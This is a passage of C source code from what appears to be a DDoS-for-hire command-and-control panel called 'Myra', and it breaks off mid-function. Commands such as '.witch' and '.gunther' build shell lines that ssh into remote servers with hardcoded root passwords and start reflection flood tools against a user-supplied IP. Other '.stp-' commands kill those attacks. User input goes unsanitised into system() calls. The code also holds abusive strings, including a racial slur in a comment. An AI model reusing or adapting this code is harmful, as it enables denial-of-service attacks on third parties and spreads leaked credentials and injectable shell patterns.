      sprintf(status09, "     \e[38;5;225m║     \e[38;5;168mHyperpower \e[38;5;225m[\e[38;5;134mIII\e[38;5;225m]    ╠════\e[38;5;134m> \e[38;5;168mStatus \e[38;5;134m: \e[38;5;161mOffline \e[38;5;134m!\r\n");
      sprintf(status10, "     \e[38;5;225m╚═════════════╦═══════════╝\r\n");
      sprintf(status11, "     \e[38;5;225m╔═════════════╩═══════════╗\r\n");
      sprintf(status12, "     \e[38;5;225m║   \e[38;5;168mMyra Backend System   \e[38;5;225m╠════\e[38;5;134m> \e[38;5;168mStatus \e[38;5;134m: \e[38;5;225mOnline  \e[38;5;134m!\r\n");
      sprintf(status13, "     \e[38;5;225m╚═════════════╦═══════════╝\r\n");
      sprintf(status14, "     \e[38;5;225m╔═════════════╩═══════════╗\r\n");
      sprintf(status15, "     \e[38;5;225m║   \e[38;5;168mMach_Swap Encryption  \e[38;5;225m╠════\e[38;5;134m> \e[38;5;168mStatus \e[38;5;134m: \e[38;5;225mOnline  \e[38;5;134m!\r\n");
      sprintf(status16, "     \e[38;5;225m╚═════════════╦═══════════╝\r\n");
      sprintf(status17, "     \e[38;5;225m╔═════════════╩═══════════╗\r\n");
      sprintf(status18, "     \e[38;5;225m║      \e[38;5;168mMyra Safe Mode     \e[38;5;225m╠════\e[38;5;134m> \e[38;5;168mStatus \e[38;5;134m: \e[38;5;225mOnline  \e[38;5;134m!\r\n");
      sprintf(status19, "     \e[38;5;225m╚═════════════╦═══════════╝\r\n");
      sprintf(status20, "     \e[38;5;225m╔═════════════╩═══════════╗\r\n");
      sprintf(status21, "     \e[38;5;225m║   \e[38;5;168mMyra Emergency Power  \e[38;5;225m╠════\e[38;5;134m> \e[38;5;168mStatus \e[38;5;134m: \e[38;5;161mOffline \e[38;5;134m!\r\n");
      sprintf(status22, "     \e[38;5;225m╚═════════════════════╦═══╝\r\n");
      sprintf(status23, "                           \e[38;5;225m╚══════════════════════════════════════╝\r\n");
      if (send(clear_myra_broadcast, status01, strlen(status01), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status02, strlen(status02), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status03, strlen(status03), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status04, strlen(status04), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status05, strlen(status05), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status06, strlen(status06), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status07, strlen(status07), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status08, strlen(status08), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status09, strlen(status09), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status10, strlen(status10), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status11, strlen(status11), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status12, strlen(status12), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status13, strlen(status13), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status14, strlen(status14), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status15, strlen(status15), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status16, strlen(status16), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status17, strlen(status17), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status18, strlen(status18), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status19, strlen(status19), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status20, strlen(status20), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status21, strlen(status21), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status22, strlen(status22), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, status23, strlen(status23), MSG_NOSIGNAL) == -1)
        goto finish_integer;
    }
    if (strstr(myra_buffer_size, ".hyper") || strstr(myra_buffer_size, ".hyper")) // System Command Function
    {
      //char hyper_01 [120];
      //char hyper_02 [120];
      //char hyper_03 [120];
      //char hyper_04 [120];
      //char hyper_05 [120];
      //sprintf(hyper_01,  "\e[38;5;225m[\e[38;5;134mHyperpower \e[38;5;134mII\e[38;5;225m] - \e[38;5;168mAttempting to \e[38;5;134mreinitialise attack\e[38;5;168m..\r\n");
      //sprintf(hyper_02,  "\e[38;5;225m[\e[38;5;134mHyperpower \e[38;5;134mII\e[38;5;225m] - \e[38;5;168mForcing \e[38;5;134mSubstrate VII \e[38;5;168mto exceed \e[38;5;134mthread limitation\e[38;5;168m..\r\n");
      //sprintf(hyper_03,  "\e[38;5;225m[\e[38;5;134mHyperpower \e[38;5;134mII\e[38;5;225m] - \e[38;5;168mReinitiating \e[38;5;134mattack output\e[38;5;168m..\r\n");
      //sprintf(hyper_04,  "\e[38;5;225m[\e[38;5;134mHyperpower \e[38;5;134mII\e[38;5;225m] - \e[38;5;168mContacting \e[38;5;134mSubstrate\e[38;5;168m..\r\n");
      //sprintf(hyper_05,  "\e[38;5;225m[\e[38;5;134mHyperpower \e[38;5;134mII\e[38;5;225m] - \e[38;5;134mSuccess ! \e[38;5;168mI think..\r\n");
      //if(send(clear_myra_broadcast, hyper_01, strlen(hyper_01), MSG_NOSIGNAL) == -1) return;
      //sleep(2);
      //if(send(clear_myra_broadcast, hyper_02, strlen(hyper_02), MSG_NOSIGNAL) == -1) return;
      //sleep(2);
      //if(send(clear_myra_broadcast, hyper_03, strlen(hyper_03), MSG_NOSIGNAL) == -1) return;
      //sleep(1);
      //if(send(clear_myra_broadcast, hyper_04, strlen(hyper_04), MSG_NOSIGNAL) == -1) return;
      //sleep(1);
      //if(send(clear_myra_broadcast, hyper_05, strlen(hyper_05), MSG_NOSIGNAL) == -1) return;
      char menuoutput5[5000];
      sprintf(menuoutput5, "\e[38;5;225mWait until the \e[38;5;134mfull release \e[38;5;168m!\r\n");
      if (send(clear_myra_broadcast, menuoutput5, strlen(menuoutput5), MSG_NOSIGNAL) == -1)
        goto finish_integer;
    }
    if (strstr(myra_buffer_size, ".stp-lhvz") || strstr(myra_buffer_size, ".STP-LHVZ")) // System Comhome Function
    {
      char command5[500];
      trim_removev2(command5);
      //char command6[500];
      //trim_removev2(command6);
      strcpy(command5, "screen -d -m sshpass -p succfuccs1234@12 ssh root@193.201.82.173 pkill lhvz; pkill lhvz");
      //strcpy(command6, "screen -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 pkill kratos; pkill kratos");
      system(command5);
      //system(command6);
      // little msg to output
      sprintf(myra, "\e[38;5;134mOkay \e[38;5;168m%s\e[38;5;134m, \e[38;5;168mI killed your \e[38;5;225mprivate \e[38;5;134mMyra \e[38;5;168mattack \e[38;5;25m!\r\n", accounts[find_line].username, myra_buffer_size);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".stp-ark-drop") || strstr(myra_buffer_size, ".STP-ARK-DROP")) // System Comhome Function
    {
      char command5[500];
      trim_removev2(command5);
      char command6[500];
      trim_removev2(command6); /*90UJA90JKiopjfs9ipaofjewp9jfweru3298RJEWRhjtiure ssh root@45.143.220.92*/
      strcpy(command5, "screen -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 pkill ark2; pkill ark2");
      strcpy(command6, "screen -d -m sshpass -p 90UJA90JKiopjfs9ipaofjewp9jfweru3298RJEWRhjtiure ssh root@45.143.220.92 pkill ark-crash; pkill ark-crash");
      //strcpy(command6, "screen -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 pkill kratos; pkill kratos");
      system(command5);
      system(command6);
      // little msg to output
      sprintf(myra, "\e[38;5;134mOkay \e[38;5;168m%s\e[38;5;134m, \e[38;5;168mI killed your \e[38;5;225mprivate \e[38;5;134mMyra \e[38;5;168mattack \e[38;5;25m!\r\n", accounts[find_line].username, myra_buffer_size);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".stp-home") || strstr(myra_buffer_size, ".STP-HOME")) // System Comhome Function
    {
      char command5[500];
      trim_removev2(command5);
      //char command6[500];
      //trim_removev2(command6);
      strcpy(command5, "screen -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 pkill udphex; pkill udphex");
      //strcpy(command6, "screen -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 pkill kratos; pkill kratos");
      system(command5);
      //system(command6);
      // little msg to output
      sprintf(myra, "\e[38;5;134mOkay \e[38;5;168m%s\e[38;5;134m, \e[38;5;168mI killed your \e[38;5;225mprivate \e[38;5;134mMyra \e[38;5;168mattack \e[38;5;25m!\r\n", accounts[find_line].username, myra_buffer_size);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".stp-redbars") || strstr(myra_buffer_size, ".STP-REDBARS")) // System Comhome Function
    {
      char command5[500];
      trim_removev2(command5);
      //char command6[500];
      //trim_removev2(command6);
      strcpy(command5, "screen -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 pkill udphex; pkill udphex");
      //strcpy(command6, "screen -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 pkill kratos; pkill kratos");
      system(command5);
      //system(command6);
      // little msg to output
      sprintf(myra, "\e[38;5;134mOkay \e[38;5;168m%s\e[38;5;134m, \e[38;5;168mI killed your \e[38;5;225mprivate \e[38;5;134mMyra \e[38;5;168mattack \e[38;5;25m!\r\n", accounts[find_line].username, myra_buffer_size);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".stp-r6-drop") || strstr(myra_buffer_size, ".STP-R6-DROP")) // System Comhome Function
    {
      char command5[500];
      trim_removev2(command5);
      //char command6[500];
      //trim_removev2(command6);
      strcpy(command5, "screen -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 pkill r6-drop; pkill r6-drop");
      //strcpy(command6, "screen -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 pkill kratos; pkill kratos");
      system(command5);
      //system(command6);
      // little msg to output
      sprintf(myra, "\e[38;5;134mOkay \e[38;5;168m%s\e[38;5;134m, We have aborted your \e[38;5;168mRainbow \e[38;5;134meskimo babies \e[38;5;168m!\r\n", accounts[find_line].username, myra_buffer_size);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".stp-fn-drop") || strstr(myra_buffer_size, ".STP-FN-DROP")) // System Comhome Function
    {
      char command5[500];
      trim_removev2(command5);
      //char command6[500];
      //trim_removev2(command6);
      strcpy(command5, "screen -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 pkill fn-drop; pkill fn-drop");
      //strcpy(command6, "screen -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 pkill kratos; pkill kratos");
      system(command5);
      //system(command6);
      // little msg to output
      sprintf(myra, "\e[38;5;134mOkay \e[38;5;168m%s\e[38;5;134m, We have aborted your \e[38;5;168mFortnite \e[38;5;134meskimo babies \e[38;5;168m!\r\n", accounts[find_line].username, myra_buffer_size);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".stp-kratos") || strstr(myra_buffer_size, ".STP-KRATOS")) // System Comhome Function
    {
      char command5[500];
      trim_removev2(command5);
      //char command6[500];
      //trim_removev2(command6);
      strcpy(command5, "screen -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 pkill kratos; pkill kratos");
      //strcpy(command6, "screen -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 pkill kratos; pkill kratos");
      system(command5);
      //system(command6);
      // little msg to output
      sprintf(myra, "\e[38;5;134mOkay \e[38;5;168m%s\e[38;5;134m, We have aborted your \e[38;5;168mKratos \e[38;5;134meskimo babies \e[38;5;168m!\r\n", accounts[find_line].username, myra_buffer_size);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".stp-ethera") || strstr(myra_buffer_size, ".STP-ETHERA")) // System Comhome Function
    {
      char command5[500];
      trim_removev2(command5);
      //char command6[500];
      //trim_removev2(command6);
      strcpy(command5, "screen -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 pkill ethera; pkill ethera");
      //strcpy(command6, "screen -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 pkill osiris; pkill osiris");
      system(command5);
      //system(command6);
      // little msg to output
      sprintf(myra, "\e[38;5;134mOkay \e[38;5;168m%s\e[38;5;134m, We have aborted your \e[38;5;168mEthera \e[38;5;134meskimo babies \e[38;5;168m!\r\n", accounts[find_line].username, myra_buffer_size);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".stp-osiris") || strstr(myra_buffer_size, ".STP-OSIRIS")) // System Comhome Function
    {
      char command5[500];
      trim_removev2(command5);
      //char command6[500];
      //trim_removev2(command6);
      strcpy(command5, "screen -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 pkill osiris; pkill osiris");
      //strcpy(command6, "screen -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 pkill osiris; pkill osiris");
      system(command5);
      //system(command6);
      // little msg to output
      sprintf(myra, "\e[38;5;134mOkay \e[38;5;168m%s\e[38;5;134m, We have aborted your \e[38;5;168mOsiris \e[38;5;134meskimo babies \e[38;5;168m!\r\n", accounts[find_line].username, myra_buffer_size);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".stp-odin") || strstr(myra_buffer_size, ".STP-ODIN")) // System Comhome Function
    {
      char command5[500];
      trim_removev2(command5);
      //char command6[500];
      //trim_removev2(command6);
      strcpy(command5, "screen -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 pkill odin; pkill odin");
      //strcpy(command6, "screen -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 pkill odin; pkill odin");
      system(command5);
      //system(command6);
      // little msg to output
      sprintf(myra, "\e[38;5;134mOkay \e[38;5;168m%s\e[38;5;134m, We have aborted your \e[38;5;168mOdin \e[38;5;134meskimo babies \e[38;5;168m!\r\n", accounts[find_line].username, myra_buffer_size);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".stp-phoenix") || strstr(myra_buffer_size, ".STP-PHOENIX")) // System Comhome Function
    {
      char command5[500];
      trim_removev2(command5);
      //char command6[500];
      //trim_removev2(command6);
      strcpy(command5, "screen -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 pkill phoenix; pkill phoenix");
      //strcpy(command6, "screen -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 pkill phoenix; pkill phoenix");
      system(command5);
      //system(command6);
      // little msg to output
      sprintf(myra, "\e[38;5;134mOkay \e[38;5;168m%s\e[38;5;134m, We have aborted your \e[38;5;168mPhoenix \e[38;5;134meskimo babies \e[38;5;168m!\r\n", accounts[find_line].username, myra_buffer_size);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".stp-oryx") || strstr(myra_buffer_size, ".STP-ORYX")) // System Comhome Function
    {
      char command5[500];
      trim_removev2(command5);
      //char command6[500];
      //trim_removev2(command6);
      //char command7[500];
      //trim_removev2(command7);
      strcpy(command5, "screen -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 pkill oryx; pkill oryx");
      //strcpy(command6, "screen -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 pkill oryx; pkill oryx");
      // strcpy(command7, "screen -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 pkill oryx; pkill oryx");
      system(command5);
      //system(command6);
      //system(command7);
      // little msg to output
      sprintf(myra, "\e[38;5;134mOkay \e[38;5;168m%s\e[38;5;134m, We have aborted your \e[38;5;168mOryx \e[38;5;134meskimo babies \e[38;5;168m!\r\n", accounts[find_line].username, myra_buffer_size);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".stp-gunther") || strstr(myra_buffer_size, ".STP-GUNTHER")) // System Comhome Function
    {
      char command5[500];
      trim_removev2(command5);
      //char command6[500];
      ////trim_removev2(command6);
      strcpy(command5, "screen -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 pkill gunther; pkill gunther");
      //strcpy(command6, "screen -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 pkill gunther; pkill gunther");
      system(command5);
      //system(command6);
      // little msg to output
      sprintf(myra, "\e[38;5;134mOkay \e[38;5;168m%s\e[38;5;134m, We have aborted your \e[38;5;168mGunther \e[38;5;134meskimo babies \e[38;5;168m!\r\n", accounts[find_line].username, myra_buffer_size);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".stp-massacre") || strstr(myra_buffer_size, ".STP-MASSACRE")) // System Comhome Function
    {
      char command5[500];
      trim_removev2(command5);
      //char command6[500];
      ////trim_removev2(command6);
      strcpy(command5, "screen -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 pkill massacre; pkill massacre");
      //strcpy(command6, "screen -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 pkill katura; pkill katura");
      system(command5);
      //system(command6);
      // little msg to output
      sprintf(myra, "\e[38;5;134mOkay \e[38;5;168m%s\e[38;5;134m, You have stopped \e[38;5;168mMassacring \e[38;5;134mlittle babies \e[38;5;168m!\r\n", accounts[find_line].username, myra_buffer_size);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".stp-katura") || strstr(myra_buffer_size, ".STP-KATURA")) // System Comhome Function
    {
      char command5[500];
      trim_removev2(command5);
      //char command6[500];
      ////trim_removev2(command6);
      strcpy(command5, "screen -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 pkill katura; pkill katura");
      //strcpy(command6, "screen -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 pkill katura; pkill katura");
      system(command5);
      //system(command6);
      // little msg to output
      sprintf(myra, "\e[38;5;134mOkay \e[38;5;168m%s\e[38;5;134m, We have aborted your \e[38;5;168mKatura \e[38;5;134meskimo babies \e[38;5;168m!\r\n", accounts[find_line].username, myra_buffer_size);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".stp-witch") || strstr(myra_buffer_size, ".STP-WITCH")) // System Comhome Function
    {
      char command5[500];
      trim_removev2(command5);
      //char command6[500];
      //trim_removev2(command6);
      strcpy(command5, "screen -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 pkill witch; pkill witch");
      //strcpy(command6, "screen -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 pkill witch; pkill witch");
      system(command5);
      //system(command6);
      // little msg to output
      sprintf(myra, "\e[38;5;134mOkay \e[38;5;168m%s\e[38;5;134m, We have aborted your \e[38;5;168mWitch \e[38;5;134meskimo babies \e[38;5;168m!\r\n", accounts[find_line].username, myra_buffer_size);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".witch") || strstr(myra_buffer_size, ".WITCH")) // System Command Function
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];                                                   // Creating A System Function
      trim_removev2(ipkill2);
      // Trim [ipkill] screen -d -m sshpass -p suckyourdad1234@ ssh root@nigger1 /usr/sbin/c2/amp/methods/layer4/v1/reflection/witch-atk/witch %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/witch-atk/witch.txt 4 -1 120\r\n", iptarget);
      //char *ipkill3[5000]; // Creating A System Function
      //trim_removev2(ipkill3);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mWITCH\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mWITCH\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -S \"%s.[%s].witch.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 ./witch %s witch.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill3, "screen -S \"%s.[%s].witch.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 ./witch %s witch.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \x1b[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mWITCH    \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \x1b[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-WITCH\x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \x1b[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".gunther") || strstr(myra_buffer_size, ".GUNTHER")) // BT DHT
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];
      trim_removev2(ipkill2);
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mGUNTHER\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mHOME\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -S \"%s.[%s].gunther.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 ./gunther %s gunther.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill3, "screen -S \"%s.[%s].gunther.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 ./gunther %s gunther.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mGUNTHER  \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200 \r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-GNTR \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".phoenix") || strstr(myra_buffer_size, ".PHOENIX")) // BT DHT
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];
      trim_removev2(ipkill2);
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
